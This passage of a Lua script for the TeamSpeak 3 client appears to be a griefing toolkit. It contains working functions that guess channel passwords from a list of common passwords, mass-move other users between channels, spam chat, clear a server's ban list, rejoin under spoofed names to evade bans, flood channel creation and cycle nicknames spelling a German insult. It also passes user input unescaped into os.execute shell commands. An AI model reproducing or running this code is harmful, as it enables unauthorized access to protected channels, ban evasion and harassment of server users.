                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 79, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 28, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 37, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 53, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 12, password)
                        end
                end
        end
		--ts3.printMessageToCurrentTab("Spammed!")
end
function emcspam()
	i = 1
	count = 50
	while i  <= count do
		 local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
		 local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
		 ts3.printMessageToCurrentTab("[color=".. RANDCOL .."]".. SpamMSG .."[/color]")
		 i = i + 1
	end
end
function selfKick(serverConnectionHandlerID, emc_skreason)
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	ts3.requestClientKickFromChannel(serverConnectionHandlerID,myClientID,emc_skreason)
	ts3.requestClientKickFromServer(serverConnectionHandlerID, myClientID, emc_skreason)
end
function selfServerKICK(serverConnectionHandlerID, emc_skreason)
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	ts3.requestClientKickFromServer(serverConnectionHandlerID, myClientID, emc_skreason)
end
function selfChannelKICK(serverConnectionHandlerID, emc_skreason)
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	ts3.requestClientKickFromChannel(serverConnectionHandlerID,myClientID,emc_skreason)
end
function SecretChannelKICK(serverConnectionHandlerID)
	local randomNumber = math.random(100,9999999)
	local myClientID = ts3.getClientID(serverConnectionHandlerID)
	local oldChannelID = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	local oldNick = ts3.getClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME)
		ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, randomNumber)
		ts3.flushClientSelfUpdates(serverConnectionHandlerID)
		ts3.requestClientKickFromChannel(serverConnectionHandlerID,myClientID, "")
		ts3.requestClientMove(serverConnectionHandlerID, myClientID, oldChannelID, "")
		ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, oldNick)
		ts3.flushClientSelfUpdates(serverConnectionHandlerID)
end
function uid(serverConnectionHandlerID, emc_uid)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Searching TS3Index for UID: ".. emc_uid .."[/color]")
	os.execute('start "" "http://ts3index.com/?page=searchclient&uid=' .. emc_uid .. '"')
	--os.execute('start http://www.google.de/')
end
function name(serverConnectionHandlerID, emc_name)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Searching TS3Index for Name: ".. emc_name .."[/color]")
	os.execute('start "" "http://ts3index.com/?page=searchclient&nickname=' .. emc_name .. '"')
--os.execute('start http://www.google.de/')
end
function tsvname(serverConnectionHandlerID, emc_tsvname)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Searching TSViewer for Name: ".. emc_tsvname .."[/color]")
	os.execute('start "" "http://www.tsviewer.com/index.php?page=search&action=ausgabe_user&nickname=' .. emc_tsvname .. '"')
--os.execute('start http://www.google.de/')
end
function servername(serverConnectionHandlerID, emc_servername)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	--local emc_servername = ts3.getServerVariableAsInt(serverConnectionHandlerID, VIRTUALSERVER_NAME)
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Searching TSViewer for Servername: ".. emc_servername .."[/color]")
	os.execute('start "" "http://www.tsviewer.com/index.php?page=search&action=ausgabe&suchbereich=name&suchinhalt=' .. emc_servername .. '"')
--os.execute('start http://www.google.de/')
end
function serverip(serverConnectionHandlerID, emc_serverip)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Searching TSViewer for Serverip: ".. emc_serverip .."[/color]")
	os.execute('start "" "http://www.tsviewer.com/index.php?page=search&action=ausgabe&suchbereich=ip&suchinhalt=' .. emc_serverip .. '"')
--os.execute('start http://www.google.de/')
end
function sbanner(serverConnectionHandlerID, emc_serverbanner)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Showing Serverbanner for TSViewer-ID: ".. emc_serverbanner .."[/color]")
	ts3.printMessageToCurrentTab("[URL=http://www.tsviewer.com/index.php?page=ts_viewer&ID=".. emc_serverbanner .."][IMG]http://www.tsviewer.com/promotion/dynamic_sig/sig.php/clan468x60_bf3/.. emc_serverbanner ..png[/IMG][/URL]")
end
function bans(serverConnectionHandlerID)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Showing Banlist for Server: ".. serverConnectionHandlerID .."[/color]")
	ts3.requestBanList(serverConnectionHandlerID)
end
function clearbans(serverConnectionHandlerID)
	local emcColors = { 'Black', 'White', 'Green', 'Yellow', 'Red', 'Blue', 'Orange', '#ff00ff', '#005500' }
	local RANDCOL = ( emcColors[ math.random( #emcColors ) ] )
	ts3.printMessageToCurrentTab("[color=".. RANDCOL .."][EMC] Clearing Banlist for Server: ".. serverConnectionHandlerID .."[/color]")
	ts3.bandelall(serverConnectionHandlerID)
end
function cls(serverConnectionHandlerID)
	i = 1
	count = 15
	while i  <= count do
		 ts3.printMessageToCurrentTab("")
		 i = i + 1
	end
end
function clear(serverConnectionHandlerID)
	i = 1
	count = 1000
	while i  <= count do
		 ts3.printMessageToCurrentTab("")
		 i = i + 1
	end
end

-- function clientlist(serverConnectionHandlerID)
	-- local clients, error = ts3.getClientList(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_not_connected then
		-- ts3.printMessage(serverConnectionHandlerID, "Not connected")
		-- return
	-- elseif error ~= ts3errors.ERROR_ok then
		-- print("Error getting client list: " .. error)
		-- return
	-- end
	-- printMessageToCurrentTab("Clients: ".. clients ..".",clients)
	-- printMessageToCurrentTab(toCSV(clients))
-- end

function muteownchan(serverConnectionHandlerID)
	local myId = ts3.getClientID(serverConnectionHandlerID)
	if (myId ~= clientID)
		then return
	end
	local myCh = ts3.getChannelOfClient(serverConnectionHandlerID, myId)
	local clients = ts3.getChannelClientList(serverConnectionHandlerID, ch);
	-- TODO: Iterate over the client List and remove those that are Channel Commander
	local muted = ts3.getClientVariableAsInt(serverConnectionHandlerID, clients[i], ts3defs.ClientProperties.CLIENT_IS_MUTED)
	if muted == 1 then
		table.insert(mutedClients, clients)
	end
	if #mutedClients > clients/2 then
		ts3.requestMuteClients(serverConnectionHandlerID, clients)
	else
		ts3.requestUnmuteClients(serverConnectionHandlerID, clients)
	end
end

local function mutechan(scH, ch, mode)
	local clients = ts3.getChannelClientList(scH, ch);
	if (mode == 1) then
		ts3.requestMuteClients(scH, clients)
	else
		ts3.requestUnmuteClients(scH, clients)
	end
end
-- 	if #mutedClients > #channelClients/2 then
-- 		ts3.requestUnmuteClients(serverConnectionHandlerID, channelClients)

-- 	else
-- 		ts3.requestMuteClients(serverConnectionHandlerID, channelClients)
-- 	end
-- end
function reconnect(serverConnectionHandlerID)
	local myId = ts3.getClientID(serverConnectionHandlerID)
	local nameArray = { 'TeamspeakUser', 'TeamSpeakUser', 'Android', 'Android_Client', 'IPhone', 'IPhone_Client' }
	local RANDNAME = ( nameArray[ math.random( #nameArray ) ] )
	-- local displayName = ts3.getClientDisplayName(serverConnectionHandlerID, myId)
	-- local displayName = math.random(100,9999999)
	local displayName = RANDNAME .. math.random(1,9999)
	local serverAddress = ts3.getConnectionVariableAsString(serverConnectionHandlerID, myId, 6)
	-- local serverPort = ts3.getConnectionVariableAsInt(serverConnectionHandlerID, myId, CONNECTION_SERVER_PORT)
	-- if unexpected_condition then error() end
	-- if error ~= ts3errors.ERROR_ok then
	local serverPort = "9987"
	-- end
	--local serverPassword = ts3.getServerVariableAsString(serverConnectionHandlerID, serverPassword)
	-- ts3.printMessageToCurrentTab("serverConnectionHandlerID: ".. serverConnectionHandlerID .." myId: ".. myId .." displayName: ".. displayName .." serverAddress: ".. serverAddress)
	local serverConnectionHandlerID, error = ts3.guiConnect(1, "Reconnect", serverAddress ..":" .. serverPort, "gast8", displayName, "", "", "", "", "", "", "", "", "")
	if error ~= ts3errors.ERROR_ok then
		print("Error rejoining Server: " .. error)
		return
	end
end
function reconnectRandom(serverConnectionHandlerID)
	local myId = ts3.getClientID(serverConnectionHandlerID)
	local nameArray = { 'TeamspeakUser', 'TeamSpeakUser', 'Android', 'Android_Client', 'IPhone', 'IPhone_Client' }
	local RANDNAME = ( nameArray[ math.random( #nameArray ) ] )
	-- local displayName = ts3.getClientDisplayName(serverConnectionHandlerID, myId)
	-- local displayName = math.random(100,9999999)
	local displayName = RANDNAME .. math.random(1,9999)
	local channelID = math.random(1,99)
	local serverAddress = ts3.getConnectionVariableAsString(serverConnectionHandlerID, myId, 6)
	-- local serverPort = ts3.getConnectionVariableAsInt(serverConnectionHandlerID, myId, CONNECTION_SERVER_PORT)
	-- if unexpected_condition then error() end
	-- if error ~= ts3errors.ERROR_ok then
	-- local serverPort = "5033"
	-- end
	--local serverPassword = ts3.getServerVariableAsString(serverConnectionHandlerID, serverPassword)
	-- ts3.printMessageToCurrentTab("serverConnectionHandlerID: ".. serverConnectionHandlerID .." myId: ".. myId .." displayName: ".. displayName .." serverAddress: ".. serverAddress)
--ts3.guiConnect(connectTab, serverLabel, serverAddress, serverPassword, nickname, channel, channelPassword, captureProfile, playbackProfile, hotkeyProfile, soundProfile, userIdentity, oneTimeKey, phoneticName)
	ts3.printMessageToCurrentTab(myId.." "..RANDNAME.." "..displayName.." "..channelID.." "..serverAddress)
	local serverConnectionHandlerID, error = ts3.guiConnect(1, "randomReconnect", serverAddress, "gast8", displayName, channelID, "", "", "", "", "", "", "", displayName)
	if error ~= ts3errors.ERROR_ok then
		print("Error rejoining Server: " .. error)
		return
	end
end
function tryChannelPW(serverConnectionHandlerID, channelNumber)
	local myClientID = ts3.getClientID(serverConnectionHandlerID)
	local pwArray = { '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890' }
	for i=1, #pwArray do
		ts3.printMessageToCurrentTab(i.." > Trying to crack PW of channel: "..channelNumber..". Using PW: "..pwArray[i])
		ts3.requestClientMove(serverConnectionHandlerID, myClientID, channelNumber, pwArray[i])
	end
end
function tryChannelPW2(serverConnectionHandlerID, channelNumber)
	local myClientID = ts3.getClientID(serverConnectionHandlerID)
	local pwArray = { 'pw', 'PW', 'passwort', 'Passwort', 'password' , 'Password' }
	for i=1, #pwArray do
		ts3.printMessageToCurrentTab(i.." > Trying to crack PW of channel: "..channelNumber..". Using PW: "..pwArray[i])
		ts3.requestClientMove(serverConnectionHandlerID, myClientID, channelNumber, pwArray[i])
	end
end
-- function timer
	-- while true do
		-- sleep(1)
		-- local x = os.clock()
		-- local s = 0
		-- for i=1,100000 do s = s + i end
		-- ts3.printMessageToCurrentTab(string.format("elapsed time: %.2f\n", os.clock() - x))
	-- end
-- end
-- function freeze
	-- while true do
		-- local x = os.clock()
		-- local s = 0
		-- for i=1,100000 do s = s + i end
		-- ts3.printMessageToCurrentTab(string.format("elapsed time: %.2f\n", os.clock() - x))
	-- end
-- end
function createrandomChannelLOOP(serverConnectionHandlerID)
	-- local sleepDelay = sleepDelay
	for i = 1, 15 do
		createrandomChannel(serverConnectionHandlerID)
		wsleep(1)
    end
end
function editChannel(serverConnectionHandlerID, channelID, channelName, channelNamePhonetic, channelPassword, channelDescription)

	if channelName ~= "0" then
		ts3.setChannelVariableAsString(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_NAME,channelName)
	end
	if channelNamePhonetic ~= "0" then
		ts3.setChannelVariableAsString(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_NAME_PHONETIC,channelNamePhonetic)
	end
	if channelPassword ~= "0" then
		ts3.setChannelVariableAsString(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_PASSWORD,channelPassword)
	end
	--ts3.setChannelVariableAsString(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_TOPIC,channelTopic)
	if channelDescription ~= "0" then
	ts3.setChannelVariableAsString(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_DESCRIPTION,channelDescription)
	end
	--ts3.setChannelVariableAsInt(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_MAXCLIENTS,channelMaxClients)
	--ts3.setChannelVariableAsInt(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_NEEDED_TALK_POWER,channelNeededTP)
	--ts3.setChannelVariableAsInt(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_ICON_ID,channelIconID)
	--ts3.setChannelVariableAsInt(serverConnectionHandlerID, 0,ts3defs.ChannelProperties.CHANNEL_FLAG_SEMI_PERMANENT,channelIsSemi)
	local channelOldName = ts3.getChannelVariableAsString(serverConnectionHandlerID,channelID,ts3defs.ChannelProperties.CHANNEL_NAME,channelName)
	--ts3.printMessageToCurrentTab("ChannelID: "  .. channelID)
	local error = ts3.flushChannelUpdates(serverConnectionHandlerID,channelID)
	if error ~= ts3errors.ERROR_ok then
		ts3.printMessageToCurrentTab("Error editing channel: "..channelOldName.." ("..channelID.."), ErrorID: "  .. error)
		return
	end
end
function toggleModerated()
	local schID = ts3.getCurrentServerConnectionHandlerID()
	local myID = ts3.getClientID(schID)
	local channel = ts3.getChannelOfClient(schID, myID)
	local needTP, ntpe = ts3.getChannelVariableAsInt(schID, channel, ts3defs.ChannelProperties.CHANNEL_NEEDED_TALK_POWER)
	if (needTP == 0) then
		ts3.setChannelVariableAsInt(schID, channel, ts3defs.ChannelProperties.CHANNEL_NEEDED_TALK_POWER, 75)
		ts3.flushChannelUpdates(schID, channel)
		ts3.printMessageToCurrentTab("Talk Power for Channel: "..channel.." set to: 75")
	else
		ts3.setChannelVariableAsInt(schID, channel, ts3defs.ChannelProperties.CHANNEL_NEEDED_TALK_POWER, 0)
		ts3.flushChannelUpdates(schID, channel)
		ts3.printMessageToCurrentTab("Talk Power for Channel: "..channel.." set to: 0")
	end
end
function renameSelf(serverConnectionHandlerID, newNick)
	--local newNick = "Tessttttt"
	ts3.printMessageToCurrentTab("Renaming self to "..newNick..".")
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, newNick)
	-- ts3.printMessageToCurrentTab("FLushing")
	local error = ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		ts3.printMessageToCurrentTab("Error renaming to "..newnick..", ErrorID: "  .. error)
		return
	end
end
function renameSelfFAST(serverConnectionHandlerID, newNick)
	local oldNick = ts3.getClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME)
	ts3.printMessageToCurrentTab("Renaming self to "..newNick..".")
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, newNick)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, oldNick)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
end
function randomName(serverConnectionHandlerID)
	local newNick = math.random(100,9999999)
	ts3.printMessageToCurrentTab("Renaming self to "..newNick..".")
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, newNick)
	local error = ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		ts3.printMessageToCurrentTab("Error renaming to "..newnick..", ErrorID: "  .. error)
		return
	end
	-- ts3.printMessageToCurrentTab("fin")
end
function randomNick(serverConnectionHandlerID)
	local nameArray = { 'TeamspeakUser', 'TeamSpeakUser', 'Android', 'Android_Client', 'IPhone', 'IPhone_Client' }
	local RANDNAME = ( nameArray[ math.random( #nameArray ) ] )
	local newNick = RANDNAME .. math.random(1,9999)
	ts3.printMessageToCurrentTab("Renaming self to "..newNick..".")
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, newNick)
	local error = ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		ts3.printMessageToCurrentTab("Error renaming to "..newnick..", ErrorID: "  .. error)
		return
	end
	-- ts3.printMessageToCurrentTab("fin")
end
function randomNameLoop(serverConnectionHandlerID)
	while true do
		local newNick = math.random(100,9999999)
		ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, newNick)
		ts3.flushClientSelfUpdates(serverConnectionHandlerID)
		wsleep(0.2)
	end
end
function nameAnimate(serverConnectionHandlerID)
	local oldNick = ts3.getClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME)
	-- ts3.printMessageToCurrentTab("SID: "..serverConnectionHandlerID)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "ICH")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "FICKE")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "DEIN")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "LEBEN")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "DU")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "KLEINER")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "HUREN")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "SOHN!")
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, oldNick)
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
end
function mtGChecker(serverConnectionHandlerID)
	local mtGCheckerPrefix = "[mtGChecker]"
	local oldNick = ts3.getClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME)
	ts3.printMessageToCurrentTab("SID: "..serverConnectionHandlerID)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "Lore")
	-- wsleep(0.1)
	local error = ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_client_nickname_inuse then
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=red]Lore ist gerade online![/color][/b]")
	-- elseif error ~= ts3errors.ERROR_ok then
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=green]Lore ist gerade offline![/color][/b]")
	-- else
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=grey]Onlinestatus von Lore unbekannt![/color][/b]")
	-- end
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "Kev")
	-- wsleep(0.1)
	local error = ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_client_nickname_inuse then
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=red]Kev ist gerade online![/color][/b]")
	-- elseif error ~= ts3errors.ERROR_ok then
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=green]Kev ist gerade offline![/color][/b]")
	-- else
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=grey]Onlinestatus von Kev unbekannt![/color][/b]")
	-- end
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, "Sling")
	-- wsleep(0.1)
	local error = ts3.flushClientSelfUpdates(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_client_nickname_inuse then
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=red]Sling ist gerade online![/color][/b]")
	-- elseif error ~= ts3errors.ERROR_ok then
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=green]Kev ist gerade offline![/color][/b]")
	-- else
		-- ts3.printMessageToCurrentTab(mtGCheckerPrefix.." [b][color=grey]Onlinestatus von Kev unbekannt![/color][/b]")
	-- end
	wsleep(0.1)
	ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, oldNick)
	-- wsleep(0.1)
	ts3.flushClientSelfUpdates(serverConnectionHandlerID)
end
-- function clockName(serverConnectionHandlerID)
	-- local systemTime = (os.date("%c"))
	-- local systemTime = (os.date("%H:%M"))
	-- local systemTime = (os.date("%d.%m.%Y | %H:%M"))
	-- ts3.setClientSelfVariableAsString(serverConnectionHandlerID, ts3defs.ClientProperties.CLIENT_NICKNAME, systemTime)
	-- ts3.flushClientSelfUpdates(serverConnectionHandlerID)
-- end
function myIP(ServerConnectionHandlerID)
	ts3.printMessageToCurrentTab("[img]http://www.anonym-surfen.com/ip-adresse.png?full=2&amp;color=33333&amp;width=350[/img]")
end
	-- -----------------------------=LOGGING=-------------------------------------
if EMC_DEBUG == true then
-- local logMSG = ("loading..." --, SCRIPT , VERSION)
 ts3.printMessageToCurrentTab("[color=darkgreen]".. SCRIPTSHORT .."[/color] functions loaded.")
-- Log(LogMSG)
end
-- ____________________________-=LOGGING=-____________________________________
-- End of functions
-----------------------------------------------------------------------------------------------------------
-- Print Message that Script has been loaded.
-----------------------------------------------------------------------------------------------------------
-- -----------------------------=LOGGING=-------------------------------------
if EMC_DEBUG == true then
-- local logMSG = " ".. SCRIPT .." ".. VERSION .. " loaded. Use [color=red]/lua run mhcmds[/color] to see a list of commands!"
 ts3.printMessageToCurrentTab("[color=darkgreen]".. SCRIPT .."[/color] [color=white][[/color][color=orange]".. VERSION .."[/color][color=white]][/color] successfully started.")
 ts3.printMessageToCurrentTab("[b][u][i]".. HLPTXT .."[/i][/u][/b]")
 ts3.printMessageToCurrentTab("[color=".. RANDCOL .."]_-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-_[/color]")
-- Log(LogMSG) 
-- CSCHID = ts3.getCurrentServerConnectionHandlerID()
-- LoadMsg (CSCHID, SCRIPT, VERSION, "")
end
-- ____________________________-=LOGGING=-____________________________________